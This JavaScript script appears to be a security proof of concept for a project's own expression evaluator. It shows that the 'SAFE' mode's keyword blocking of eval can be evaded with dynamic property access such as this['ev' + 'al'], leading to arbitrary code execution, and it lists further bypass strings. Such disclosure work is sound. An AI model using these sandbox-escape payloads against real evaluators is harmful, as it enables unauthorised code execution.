import { runExpression } from '../src/engine/evaluator.js';
import { SAFE_SECURITY_CONFIG } from '../src/security/config.js';

console.log('=== CRITICAL SECURITY BYPASS FOUND ===\n');

const testContext = {
  field1: 'test',
  Math: Math,
  String: String
};

console.log('VULNERABILITY: Dynamic property access bypasses pattern blocking');
console.log('Attack vector: this["ev" + "al"] evades the /\\beval\\b/ pattern\n');

console.log('1. Pattern blocking test:');
const blocked = runExpression('eval("1+1")', testContext, SAFE_SECURITY_CONFIG);
console.log(`eval("1+1") - BLOCKED: ${blocked === null}`);

console.log('\n2. Bypass demonstration:');
const bypassed = runExpression('this["ev" + "al"]("1+1")', testContext, SAFE_SECURITY_CONFIG);
console.log(`this["ev" + "al"]("1+1") - BYPASSED: ${bypassed}`);

console.log('\n3. What attackers can access:');
const globalKeys = runExpression('Object.keys(this)', testContext, SAFE_SECURITY_CONFIG);
console.log(`Available global objects: ${JSON.stringify(globalKeys)}`);

console.log('\n4. Critical objects accessible:');
const hasProcess = runExpression('typeof this.process !== "undefined"', testContext, SAFE_SECURITY_CONFIG);
const hasRequire = runExpression('typeof this.require !== "undefined"', testContext, SAFE_SECURITY_CONFIG);
const hasGlobal = runExpression('typeof this.global !== "undefined"', testContext, SAFE_SECURITY_CONFIG);

console.log(`Process object: ${hasProcess ? 'AVAILABLE' : 'Not available'}`);
console.log(`Require function: ${hasRequire ? 'AVAILABLE' : 'Not available'}`);
console.log(`Global object: ${hasGlobal ? 'AVAILABLE' : 'Not available'}`);

console.log('\n5. Function constructor access:');
const funcAccess = runExpression('this["ev" + "al"]("Function")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Function constructor via eval: ${typeof funcAccess}`);

console.log('\n6. Real-world attack simulation:');
// Test if we can create and execute arbitrary code
const maliciousCode = runExpression('this["ev" + "al"]("Function(\\"return 42\\")()")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Arbitrary code execution result: ${maliciousCode}`);

console.log('\n7. Other bypass patterns:');
const patterns = [
  'this["Function"]("return 42")()',
  'this["ev" + "al"]',
  'globalThis["eval"]',
  'window["eval"]' 
];

patterns.forEach(pattern => {
  const result = runExpression(pattern, testContext, SAFE_SECURITY_CONFIG);
  console.log(`${pattern}: ${result === null ? 'BLOCKED' : 'AVAILABLE'}`);
});

console.log('\n8. Context analysis:');
// Check what context is actually created
import { createSecureContext } from '../src/security/validation.js';
const secureCtx = createSecureContext(testContext, SAFE_SECURITY_CONFIG);
const ctxKeys = Object.keys(secureCtx);
console.log(`Secure context contains: ${ctxKeys.length} properties`);
console.log(`Context has eval: ${'eval' in secureCtx}`);
console.log(`Context has Function: ${'Function' in secureCtx}`);

console.log('\n=== CONCLUSION ===');
console.log('SAFE mode has a critical bypass vulnerability:');
console.log('1. Pattern matching only blocks direct keyword usage');
console.log('2. Dynamic property access (this["ev" + "al"]) bypasses pattern detection');
console.log('3. Attackers can execute arbitrary JavaScript code');
console.log('4. Full Node.js global environment is accessible');
console.log('5. This completely defeats the security model');
console.log('\nRECOMMENDation: SAFE mode is NOT SAFE for production use with untrusted input!');
